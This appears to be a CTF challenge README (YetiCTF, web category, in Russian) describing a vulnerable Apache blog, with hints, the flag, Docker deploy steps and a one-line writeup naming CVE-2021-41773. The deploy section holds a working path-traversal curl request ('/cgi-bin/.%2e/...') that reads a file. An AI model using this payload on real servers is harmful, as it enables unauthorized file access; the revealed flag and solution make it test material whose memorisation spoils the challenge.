__Category__: 
* Web

__Author__: 
* @RegularITCat

__Description__: 
Еу!
чек ит аут, очередной скрипт кидди, думающий что он крутой хакер, сделал свой блог. Как думаешь, расковыряем?

__Flag__: 
* YetiCTF{damn_br0_wanna_hackThingsWithMeX}

__Hints__: 
* О, Апач, норм.
* Ну и дичь он конечно пишет... Хотя, пост Tired интересный
* Зачекайка свеженькие proof of concept 

__Deploy__: 
* `docker build -t kiddieblog .; docker run -dp 8081:8081 --name kiddieblog kiddieblog`
* `curl "http://localhost:8081/cgi-bin/.%2e/.%2e/.%2e/.%2e/easterEgg/flag.txt"`
* `docker stop kiddieblog && docker rm kiddieblog`

__Writeup__: 

Это просто cve-2021-41773
Основная идея в том, что вы почитаете блог, увидите со временем, что он написан на апаче, пойдете поищете уязвимости, да похекаете.
